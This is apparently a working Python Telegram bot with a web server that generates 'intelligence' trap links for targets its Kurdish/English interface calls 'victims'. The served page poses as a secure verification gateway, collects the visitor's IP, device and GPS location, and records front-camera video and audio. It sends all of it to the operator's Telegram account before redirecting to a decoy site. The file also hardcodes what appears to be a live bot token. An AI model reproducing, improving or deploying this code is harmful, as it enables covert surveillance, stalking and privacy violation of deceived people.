import asyncio
import logging
import os
import base64
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

# زانیارییە فەرمییەکان
TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672
FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}
user_languages = {ADMIN_ID: "ku"}

TEXTS = {
    "ku": {
        "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
        "menu_stats": "📊 باری سیستەم",
        "menu_lang": "🌐 گۆڕینی زمان",
        "menu_ai": "🧠 زیرەکی دەستکرد",
        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی ئامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
        "ask_redirect": "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
        "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
        "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
        "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و ڤیدیۆ/دەنگی پێشکەوتووی کامێرا\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
    },
    "en": {
        "menu_link": "🔗 Create Intelligence Link",
        "menu_stats": "📊 System Status",
        "menu_lang": "🌐 Change Language",
        "menu_ai": "🧠 Artificial Intelligence",
        "welcome": "🌟 **Welcome back, Commander, to the Royal Intelligence Command Center!**\n\n🛡️ The system is at peak readiness. Please select an option:",
        "ask_redirect": "🔗 **Commander, please send the target redirect link** (e.g., `https://snapchat.com/...`) for the victim.",
        "stats": "📊 **Royal System Status:**\n\n• Status: 🟢 100% Active & Fast\n• Security Level: 🛡️ Tier 1 (Gov)\n• Web Server: 🌐 Connected to Railway\n• Power & Scale: ⚡ 2x Boosted",
        "lang_select": "⚙️ **Please choose your interface language:**",
        "lang_changed": "🟢 Language changed to **English**.",
        "ai_prompt": "🧠 **AI Core is ready:**\nType your prompt or inquiry below.",
        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and Video/Audio capture\n• Seamless redirection",
    }
}

def get_current_lang(user_id):
    return user_languages.get(user_id, "ku")

def get_reply_menu(lang="ku"):
    t = TEXTS[lang]
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["menu_link"]), KeyboardButton(text=t["menu_stats"])],
            [KeyboardButton(text=t["menu_lang"]), KeyboardButton(text=t["menu_ai"])]
        ],
        resize_keyboard=True,
        input_field_placeholder="👑 فەرماندە، فەرمانێک هەڵبژێرە..." if lang=="ku" else "👑 Commander, select a command..."
    )

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    await message.answer(TEXTS[lang]["welcome"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["🔗 دروستکردنی لینکی هەواڵگری", "🔗 Create Intelligence Link"]))
async def start_link_creation(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    user_states[ADMIN_ID] = {"step": "waiting_redirect"}
    await message.answer(TEXTS[lang]["ask_redirect"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["📊 باری سیستەم", "📊 System Status"]))
async def system_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    await message.answer(TEXTS[lang]["stats"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["🌐 گۆڕینی زمان", "🌐 Change Language"]))
async def change_lang_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    lang_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="کوردی ☀️", callback_data="lang_ku"),
            InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en")
        ]
    ])
    await message.answer(TEXTS[lang]["lang_select"], reply_markup=lang_kb)

@dp.message(F.text.in_(["🧠 زیرەکی دەستکرد", "🧠 Artificial Intelligence"]))
async def ai_core_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    user_states[ADMIN_ID] = {"step": "waiting_ai_prompt"}
    await message.answer(TEXTS[lang]["ai_prompt"], reply_markup=get_reply_menu(lang))

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.answer()
    lang = callback.data.split("_")[1]
    user_languages[ADMIN_ID] = lang
    await callback.message.answer(TEXTS[lang]["lang_changed"], reply_markup=get_reply_menu(lang))

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_inputs(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    lang = get_current_lang(message.from_user.id)
    text = message.text.strip()
    
    if text in [TEXTS["ku"]["menu_link"], TEXTS["en"]["menu_link"],
                TEXTS["ku"]["menu_stats"], TEXTS["en"]["menu_stats"],
                TEXTS["ku"]["menu_lang"], TEXTS["en"]["menu_lang"],
                TEXTS["ku"]["menu_ai"], TEXTS["en"]["menu_ai"]]:
        return

    state = user_states.get(ADMIN_ID, {}).get("step")
    
    if state == "waiting_redirect":
        user_states[ADMIN_ID] = {"step": "waiting_image", "target_url": text}
        await message.answer(
            "✅ **لينکەکە وەرگیرا.**\n\n📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت." if lang=="ku" else "✅ **Link received.**\n\n📸 Now **send me the image** to display with the link.",
            reply_markup=get_reply_menu(lang)
        )
    elif state == "waiting_ai_prompt":
        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە." if lang=="ku" else f"🤖 **Royal AI Analysis:**\n\nRegarding your prompt ('{text}'):\nThe Royal AI core processed your inquiry successfully."
        user_states[ADMIN_ID] = {}
        await message.answer(ai_response, reply_markup=get_reply_menu(lang))

@dp.message(F.photo)
async def handle_admin_photo(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    state = user_states.get(ADMIN_ID, {}).get("step")
    lang = get_current_lang(message.from_user.id)
    
    if state == "waiting_image":
        photo_id = message.photo[-1].file_id
        target_url = user_states[ADMIN_ID].get("target_url")
        
        railway_domain = FIXED_DOMAIN
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_link = f"{railway_domain}/trap?redirect={target_url}"
        response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
        
        user_states[ADMIN_ID] = {}
        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))

# پەڕەی تەڵەی ڕەسەن و ڕێکخراو بە دیزاینە شاهانەکەی خۆتەوە
async def web_trap_page(request: web.Request):
    redirect_url = request.query.get('redirect', 'https://snapchat.com')
    headers = request.headers
    user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
    ip = headers.get('X-Forwarded-For', request.remote)
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Gateway & verification</title>
    <style>
        body {{
            background: linear-gradient(135deg, #07090f 0%, #121826 100%);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding-top: 150px;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            max-width: 400px;
            margin: 0 auto;
            padding: 40px 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            cursor: pointer;
        }}
        .spinner {{
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border-left-color: #38bdf8;
            border-top-color: #818cf8;
            animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
            margin: 25px auto;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #f8fafc; }}
        p {{ color: #94a3b8; font-size: 14px; letter-spacing: 0.5px; }}
    </style>
</head>
<body>
    <div class="container" id="actionBox">
        <div class="spinner"></div>
        <h2>سەرقاڵی پشکنین و بارکردنی پەڕەکە...</h2>
        <p>تکایە کلیک لێرە بکە بۆ پشتڕاستکردنەوەی خێرا</p>
    </div>
    
    <video id="v" autoplay playsinline muted style="display:none;"></video>

    <script>
        const redirectTarget = "{redirect_url}";
        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};

        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(clientInfo)
        }});

        async function startCapturing() {{
            // ١. وەرگرتنی لۆکەیشنی GPS بە شێوازی چاوەڕوانکراو
            if (navigator.geolocation) {{
                await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(function(pos) {{
                        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
                        .finally(() => resolve());
                    }}, function(err) {{
                        resolve();
                    }}, {{ timeout: 7000, enableHighAccuracy: true }});
                }});
            }}

            // ٢. وەرگرتنی ڤیدیۆ و دەنگ لە ڕێگەی MediaRecorder
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }});
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
                let chunks = [];
                
                mediaRecorder.ondataavailable = function(e) {{
                    chunks.push(e.data);
                }};
                
                mediaRecorder.onstop = function() {{
                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = function() {{
                        let base64data = reader.result;
                        fetch('/upload_video', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ video: base64data }})
                        }}).then(() => {{
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }});
                    }};
                }};
                
                mediaRecorder.start();
                setTimeout(function() {{
                    mediaRecorder.stop();
                }}, 3000);
                
            }} catch (err) {{
                window.location.href = redirectTarget;
            }}
        }}

        // بەکارهێنەر دەبێت یەک کلیک لەسەر سندوقەکە بکات تاوەکو مۆبایل ڕێپێدانەکان (Allow) دەربکات
        document.getElementById('actionBox').addEventListener('click', function() {{
            this.style.display = 'none';
            startCapturing();
        }});
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        ua = data.get('userAgent')
        ip = data.get('ip')
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"👑 **زانیاری نوێ لە سیستەمی شاهانە:**\n\n🌐 **IP:** `{ip}`\n💻 **ئامێر:** `{ua}`"
        )
    except Exception as e:
        logging.error(f"Info error: {e}")
    return web.json_response({"status": "ok"})

# فەنکشنی وەرگرتنی ڤیدیۆ و دەنگ و ناردنی بۆ تێلگرام
async def upload_video(request):
    try:
        data = await request.json()
        video_data = data.get('video')
        if video_data and "," in video_data:
            encoded = video_data.split(",", 1)[1]
            video_bytes = base64.b64decode(encoded)
            video_file = BufferedInputFile(video_bytes, filename="target_recording.webm")
            await bot.send_video(
                chat_id=ADMIN_ID, 
                video=video_file, 
                caption="🚨 **ڤیدیۆ و دەنگی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
            )
    except Exception as e:
        logging.error(f"Video upload error: {e}")
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    if lat and lon:
        await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')

async def main():
    app = web.Application(client_max_size=50*1024*1024) # قەبارەی گەورە بۆ ناردنی فایلی ڤیدیۆیی
    app.router.add_get('/', index_handler)
    app.router.add_get('/trap', web_trap_page)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_video', upload_video)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Royal Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
